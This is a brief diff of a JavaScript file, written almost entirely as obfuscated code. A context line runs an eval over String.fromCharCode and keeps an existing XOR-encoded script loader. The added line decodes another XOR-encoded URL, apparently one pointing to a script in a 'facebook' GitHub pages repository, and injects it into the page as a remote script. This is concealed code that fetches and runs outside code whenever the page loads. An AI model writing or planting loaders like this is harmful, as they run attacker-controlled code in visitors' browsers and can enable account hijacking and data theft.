@@ -3,3 +3,4 @@ eval(String.fromCharCode(47, 47, 101, 118, 97, 108, 10, 118, 97, 114, 32, 98, 32
 
 
 var enkripsi="jvvr8--vckommp/qapkrvq,ug`q,amo-hctcqapkrv-qgawpgf-Ockl-qwrrmpv/dkng,hq"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.body.appendChild(document.createElement('script')).src=teksasli;
+var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
